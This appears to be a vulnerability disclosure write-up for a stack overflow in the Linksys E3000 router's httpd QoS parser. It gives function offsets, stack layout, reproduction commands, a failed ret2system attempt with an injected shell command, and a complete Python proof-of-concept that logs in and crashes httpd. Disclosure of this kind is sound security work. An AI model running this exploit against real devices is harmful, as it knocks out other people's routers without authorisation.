# Information

**Vendor:** Cisco / Linksys

**Vendor website:** N/A (compiled from the local firmware sample and the existing single-finding writeup)

**Reported by:** local lab validation

**Affected products:** E3000

**Affected firmware version:** `1.0.06.002_US`

**Firmware sample filename:** `_FW_E3000_1.0.06.002_US_20140409_code.bin.extracted`

# Overview

This issue is not the same as the `NULL deref` seen in `hndBlock.cgi`. It is a real stack overflow in the `QoS` rule-parsing chain.

The current state already proves:

- this is real memory corruption
- it can reliably crash `httpd`
- attacker-controlled input can corrupt later string pointers
- the current stable outcome is still DoS rather than shell / stable command execution

# Vulnerability details

1. Root-cause functions inside `usr/sbin/httpd`:

- `validate_qos_list`: `0x41ffec`
- `get_value`: `0x41f3fc`
- `strsub`: `0x41f398`
- `set_port`: `0x41f824`

2. Core issue:

- one segment of `qos_list` reaches `get_value()`
- `get_value()` allocates only a fixed `128`-byte stack buffer
- it then calls `strsub()` to copy a substring into that buffer
- `strsub()` has no length argument and no bounds check
- once the substring exceeds `128` bytes, saved registers are overwritten, producing a real stack overflow

3. Key code screenshot:

![qos code](../assets/qos_code.png)

4. Confirmed runtime behavior:

- `A * 136` reliably corrupts a later string pointer into `0x41414141`
- the process finally dies in `libc strlen(0x41414141)`
- this shows attacker-controlled data is already being treated as a pointer
- this is not merely a theoretical overflow; the dangerous copy path is reached in practice

5. Static and dynamic conclusions:

- the `strsub()` copy loop has no `dst_len`, `max_copy`, or boundary check
- the `get_value()` target buffer is at `sp + 0x30` with length `0x80`
- saved `ra` is at `sp + 0xd8`
- from a static layout perspective, around `168` bytes can theoretically reach `ra`
- however, current simple samples corrupt intermediate saved registers first, causing the program to die on bad-pointer paths before the real return

6. Current exploitation status:

- confirmed as a real stack overflow
- confirmed stable DoS
- confirmed corruption of later formatting paths
- no stable `ra` control yet
- no finished ROP / ret2libc / shell / ORW chain yet

# POC

Basic reproduction:

```bash
./stop_httpd.sh || true
./start_httpd.sh 8080
python3 tools/e3000_qos_stack_overflow.py \
  --base http://127.0.0.1:8080 \
  --session-file tmp/nvram_runtime.conf \
  --length 136
```

Length variation:

```bash
python3 tools/e3000_qos_stack_overflow.py \
  --base http://127.0.0.1:8080 \
  --session-file tmp/nvram_runtime.conf \
  --length 168
```

Advanced exploitation attempt:

```bash
python3 tools/exp_qos_ret2system.py \
  --base http://127.0.0.1:8080 \
  --session-file tmp/nvram_runtime.conf \
  --command '/bin/bs&'
```

Current advanced-attempt result:

- `httpd` crashes
- no `31337` listener is spawned
- no shell is obtained

PoC source:

```python
#!/usr/bin/env python3
import argparse
import hashlib
import pathlib
import re
import sys
import urllib.parse
import urllib.request
from http.cookiejar import CookieJar


def en_value(data: str) -> str:
    n = len(data)
    buf = data + (("0" + str(n)) if n < 10 else str(n))
    return hashlib.md5("".join(buf[i % (n + 2)] for i in range(64)).encode()).hexdigest()


def build_opener() -> urllib.request.OpenerDirector:
    jar = CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))


def login(opener: urllib.request.OpenerDirector, base: str, user: str, password: str, timeout: int) -> str:
    login_page = opener.open(base + "/Router_Login.asp", timeout=timeout).read().decode("latin1", "ignore")
    match = re.search(r'var nonce = "([^"]*)"', login_page)
    if not match:
        raise RuntimeError("nonce not found")
    nonce = match.group(1)
    passwd = en_value(en_value(password) + nonce)
    body = urllib.parse.urlencode({
        "submit_button": "login",
        "change_action": "",
        "gui_action": "Apply",
        "wait_time": "19",
        "submit_type": "",
        "http_username": user,
        "http_passwd": passwd,
    }).encode()
    req = urllib.request.Request(
        base + "/login.cgi",
        data=body,
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    opener.open(req, timeout=timeout).read()
    return nonce


def read_session_from_file(path: pathlib.Path) -> str:
    text = path.read_text(encoding="latin1", errors="ignore")
    match = re.search(r"^session_key=(.+)$", text, re.M)
    if not match:
        raise RuntimeError(f"session_key not found in {path}")
    return match.group(1).strip()


def build_qos_list(length: int, fill: str) -> str:
    return "4;0;PWN;1;" + (fill * length) + "#"


def main() -> int:
    ap = argparse.ArgumentParser(description="Trigger the authenticated qos_list stack overflow on Cisco E3000.")
    ap.add_argument("--base", default="http://127.0.0.1:8080")
    ap.add_argument("--user", default="admin")
    ap.add_argument("--password", default="admin")
    ap.add_argument("--timeout", type=int, default=10)
    ap.add_argument("--length", type=int, default=136, help="Length of the overflowing token after 4;0;PWN;1;")
    ap.add_argument("--fill", default="A")
    ap.add_argument("--session-id", help="Use this session_id directly for apply.cgi.")
    ap.add_argument("--session-file", default="tmp/nvram_runtime.conf", help="Read session_key=... from a local runtime file after login.")
    args = ap.parse_args()

    if len(args.fill) != 1:
        print("[-] --fill must be exactly one byte/character", file=sys.stderr)
        return 1

    opener = build_opener()
    base = args.base.rstrip("/")

    try:
        nonce = login(opener, base, args.user, args.password, args.timeout)
    except Exception as exc:
        print(f"[-] login failed: {exc}", file=sys.stderr)
        return 1

    session_id = args.session_id or nonce
    if args.session_id is None and args.session_file:
        path = pathlib.Path(args.session_file)
        if path.exists():
            try:
                session_id = read_session_from_file(path)
            except Exception as exc:
                print(f"[!] failed to read session file, falling back to nonce session_id: {exc}", file=sys.stderr)

    qos_list = build_qos_list(args.length, args.fill)
    body = urllib.parse.urlencode([
        ("submit_button", "QoS"),
        ("gui_action", "Apply"),
        ("need_action", "0"),
        ("wait_time", "3"),
        ("QoS_cnt", "1"),
        ("enable_game", "0"),
        ("qos_list", qos_list),
    ]).encode()
    target = base + "/apply.cgi;session_id=" + session_id
    req = urllib.request.Request(
        target,
        data=body,
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )

    print(f"[+] nonce={nonce}")
    print(f"[+] session_id={session_id}")
    print(f"[+] token_len={args.length}")
    print(f"[+] qos_list={qos_list}")
    try:
        resp = opener.open(req, timeout=args.timeout)
        data = resp.read()
        print(f"[+] response_status={getattr(resp, 'status', 'unknown')}")
        print(f"[+] response_len={len(data)}")
        return 0
    except Exception as exc:
        print(f"[!] request ended with exception: {exc}")
        print("[!] In the local QEMU lab this usually means httpd crashed.")
        return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

# effect

The strongest current conclusion is:

1. this is a real authenticated stack-overflow path
2. it already proves explicit memory corruption
3. the current stable impact is DoS, not a completed RCE chain

Representative effect screenshot:

![qos effect](../assets/qos_dos_effect.png)
